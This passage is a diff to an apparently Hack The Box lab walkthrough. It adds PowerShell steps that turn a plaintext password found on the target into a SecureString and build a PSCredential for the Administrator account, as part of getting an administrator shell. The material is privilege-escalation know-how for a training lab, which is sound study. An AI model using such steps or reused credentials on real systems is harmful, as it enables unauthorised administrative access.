@@ -21,12 +21,18 @@ This issue can be referenced from a craft machine from hack the box
 
 - now lets see how we can abuse this into getting a shell as an adminstrator, first we will need the following credential object based parameter
 
-# Create credential object based on parameters
+# Create string  that will store our password
 
-we need to create an object based paramater that will carry our credentials 
+we need to create an object based paramater that will carry our credentials lets begin with a string to hold the creds
 
 ```
 PS C:\Users\svc_minecraft\server\plugins> $SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force  
 
 we can try to make a secure password conversion 
+```
+
+# After we have store our password lets create a new object named creds that will hold this creds with a respective administrator username
+```
+PS C:\Users\svc_minecraft\server\plugins> $cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)  
+
 ```
